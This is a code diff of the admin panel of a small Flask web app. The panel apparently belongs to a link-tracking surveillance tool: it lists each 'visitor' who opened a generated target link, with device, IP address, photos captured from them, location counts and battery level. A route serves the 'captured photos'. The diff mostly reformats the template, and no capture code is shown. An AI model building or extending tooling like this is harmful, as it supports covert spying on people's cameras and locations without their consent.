-{% for id, data in visitors.items() %}
+{% for vid, data in visitors.items() %}
 <div class="visitor-card">
-<h3>🆔 {{ id }}</h3>
-<div class="info"><strong>📱 Device:</strong> {{ data.device[:60] }}</div>
-<div class="info"><strong>🌐 IP:</strong> {{ data.ip }}</div>
-<div class="info"><strong>🎯 Target:</strong> {{ data.target_url }}</div>
-<div class="info"><strong>👤 Generated By:</strong> {{ data.generated_by }}</div>
-<div class="info"><strong>📅 First Seen:</strong> {{ data.time }}</div>
-<div class="info"><strong>📊 Stats:</strong> 
-<span class="badge good">📸 {{ data.photos }}</span>
-<span class="badge good">📍 {{ data.locations }}</span>
-<span class="badge good">🔋 {{ data.battery }}</span>
-</div>
-{% set photos = data.photos|default(0) %}
-{% if photos > 0 %}
-<div class="photo-grid">
-{% for f in os.listdir('photos') if f.startswith(id ~ '_') %}
-<img src="{{ url_for('photo', filename=f) }}" loading="lazy">
-{% endfor %}
-</div>
-{% endif %}
+    <h3>🆔 {{ vid }}</h3>
+    <div class="info"><strong>📱 Device:</strong> {{ data.device[:80] }}</div>
+    <div class="info"><strong>🌐 IP:</strong> {{ data.ip }}</div>
+    <div class="info"><strong>🎯 Target:</strong> {{ data.target_url }}</div>
+    <div class="info"><strong>👤 Generated By:</strong> {{ data.generated_by }}</div>
+    <div class="info"><strong>📅 First Seen:</strong> {{ data.time }}</div>
+    <div class="info"><strong>📊 Stats:</strong>
+        <span class="badge good">📸 {{ data.photos }}</span>
+        <span class="badge good">📍 {{ data.locations }}</span>
+        <span class="badge good">🔋 {{ data.battery }}</span>
+    </div>
+    {% if data.photos_list %}
+    <div class="photo-grid">
+        {% for f in data.photos_list %}
+        <img src="{{ url_for('photo', filename=f) }}" loading="lazy">
+        {% endfor %}
+    </div>
+    {% endif %}
 </div>
 {% endfor %}
 {% endif %}
@@ -588,11 +723,12 @@ body { background: #0f0c29; color: white; font-family: Arial; padding: 20px; }
 </html>
 '''
 
+
 @app.route('/photos/<filename>')
 def photo(filename):
-    """Serve captured photos for admin panel."""
     return send_from_directory('photos', filename)
 
-# ---------- Main ----------
+
+# ---------------- Run ----------------
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
